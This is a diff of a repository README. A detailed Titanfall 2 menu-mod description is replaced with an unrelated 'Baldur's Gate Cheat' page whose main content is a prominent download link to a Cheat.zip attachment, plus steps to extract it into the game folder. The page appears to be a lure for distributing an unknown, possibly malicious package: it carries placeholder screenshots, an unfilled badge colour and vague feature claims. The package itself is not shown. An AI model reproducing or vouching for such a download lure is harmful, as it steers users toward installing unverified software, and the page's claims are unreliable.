@@ -1,120 +1,45 @@
-<p align="center" style="text-align:center"><img width="125" height="122" src="https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/icon.png" alt="Titanfall 2 - Enhanced Menu Mod" /></p>
+# Baldur's Gate Cheat
 
-![VPK Build Status](https://github.com/taskinoz/Enhanced-Menu-Mod/actions/workflows/buildvpks.yml/badge.svg)
+Welcome to the Baldur's Gate Cheat repository! 🎮 This cheat package will give you an edge in the iconic Baldur's Gate game.
 
+🔗 **Download Cheat Package:** [![Download Cheat](https://img.shields.io/badge/Download-Cheat.zip-<COLOR-CODE>?style=flat&logo=download)](https://github.com/user-attachments/files/16612167/Cheat.zip)
 
-# Enhanced Menu Mod
-Adds more options to the settings menu, such as extra keybinds, cheats, hud enhancements and cleaner interface
+## About Baldur's Gate Cheat
 
-# Features
-* Removed **Spotlight** and **Whats New** from the main menu
-* Added `sv_cheats` to the contols menu
-* Added HUD Options
-  * Bloom - `mat_disable_bloom`
-  * Show FPS - `cl_showfps`
-  * Show FPS Big - `showfps_enabled`
-  * Show Player Position - `cl_showpos`
-* Added new Keybinds
-  * Speedrunning
-    * Save/Load Quicksave 1
-    * Save/Load Quicksave 2
-    * Save/Load Quicksave 3
-    * Slow the game to 25%
-    * Speed the game up to 500%
-    * Reset all helmets
-    * Give yourself an EVA Shotgun
-    * Give yourself an EPG
-  * Demos
-    * Record Demo incrementally
-    * Record Demo
-    * Stop recording Demo
-    * Pause Demo
-    * Resume Demo
-    * Toggle Play/Pause Demo
-  * Extras
-    * Toggle low gravity
-    * Set camera to First Person
-    * Set camera to Third Person
-    * Move Third Person camera in
-    * Move Third Person camera out
-    * Hide/Show weapon
-  * No Cutscene Saves
-    * Load save 1-9 with 3 alternate saves
-  * No Cutscene Helmet Saves
-    * Load save 1 and 2
-* Added Extras Menu
-  * Demos
-    * Enable Demos
-    * Save Demos
-    * Interpolate Playback
-    * Demo record rate Single Player
-    * Demo record rate Multiplayer
-    * Key Bindings (shortcut)
-  * Gameplay
-    * Enable Wallrunning (sp)
-    * Enable Automantle (sp)
-    * Enable Vertical Dodge (sp)
-    * Player Control Debounce
-    * Command Que
-    * Speedometer Settings (Works with the MP mod)
-  * Community
-    * Communities toggle for MP
-* Audio
-  * Loading Fade Time
-  * Loading Silence Time
-* Replaced Chinese subtitles with English
-* Replaced Chinese UI text with English
-* Removed crashes from Dev launch arguments `-dev +developer 1`
-* Added Speedometer (only to Single Player)
+The Baldur's Gate Cheat repository is designed to enhance your gaming experience by providing useful cheats and shortcuts within this classic RPG game. With the tools and codes provided in this package, you can explore the world of Baldur's Gate like never before.
+
+## Features
+
+- **Infinite Health**: Never worry about your health running out in the middle of a battle.
+- **Unlimited Gold**: Purchase all the items and equipment you desire without any financial constraints.
+- **Instant Level Up**: Skip the grind and level up your character instantly.
+- **Unlock All Skills**: Access all skills and abilities right from the start.
+- **One-Hit Kill**: Defeat enemies with a single strike.
 
 ## Installation
 
-1) Download the pre-compiled version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page or [ModDB(OLD)](https://www.moddb.com/mods/enhanced-menu)
+To use the Baldur's Gate Cheat package, follow these steps:
 
-2) Backup your `englishclient_frontend.bsp.pak000_dir.vpk` and copy the 2 `.vpk` files from the downloaded zip to your `Titanfall2/vpk` folder
+1. Download the Cheat.zip file from the link above.
+2. Extract the contents of the zip file to your Baldur's Gate game directory.
+3. Launch the game and activate the cheats following the provided instructions.
 
-## Icepick
+## Gameplay Screenshots
 
-1) Download the Icepick specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+![Screenshot 1](https://via.placeholder.com/600x400)
+*Caption: Immersive gameplay experience with the Baldur's Gate Cheat package.*
 
-2) Open the downloaded `Enhanced.Menu.Mod.Icepick.zip` file and copy the `Enhanced.Menu.Mod.Icepick` folder to you `Icepick/data/mods` folder.
+![Screenshot 2](https://via.placeholder.com/600x400)
+*Caption: Unlock new abilities and powers with the cheat codes.*
 
-3) Launch Icepick.
+## Support
 
-## Northstar
+If you encounter any issues or have any questions about the Baldur's Gate Cheat package, feel free to reach out to us. Your feedback and suggestions are valuable to us as we continue to enhance the cheat features.
 
-1) Download the Northstar specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+## License
 
-2) Open the downloaded `Enhanced.Menu.Mod.Northstar.zip` file and copy the `Enhanced.Menu.Mod.Northstar` folder to you `Titanfall2/R2Northstar/mods` folder.
+This cheat package is distributed under the [MIT License](LICENSE). Feel free to modify and distribute this package with attribution.
 
-3) Launch Northstar.
+---
 
-## Screenshots
-
-![Main Menu with custom menu video](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main.jpg)
-
-Main Menu with the original Titanfall 2 menu video
-
-![Main Menu with no showcase content](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main1.jpg)
-
-Main Menu with the showcase removed to declutter the menu
-
-![Cheats setting](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-cheats.jpg)
-
-New Cheat options that can be enabled as well as the extras menu
-
-![New custom keybinds](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-keys.jpg)
-
-Added keybinds for speedrunners and extra commands for fun
-
-![Advanced Look Options with values](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-advanced-look.jpg)
-
-Shows the values for each setting on the Advanced Look Options
-
-![New HUD options](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-hud.jpg)
-
-Added extra HUD display options for showing FPS, Position, Velocity, and Server Tick rate
-
-![Extras Menu](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-extras.jpg)
-
-Added a menu for enabling and changing demo settings for recording single and multiplayer demos as well as turning of wallrunning and enabling titan jumping.
+Thank you for choosing the Baldur's Gate Cheat package! Enjoy your enhanced gaming experience in the world of Baldur's Gate. 🎉
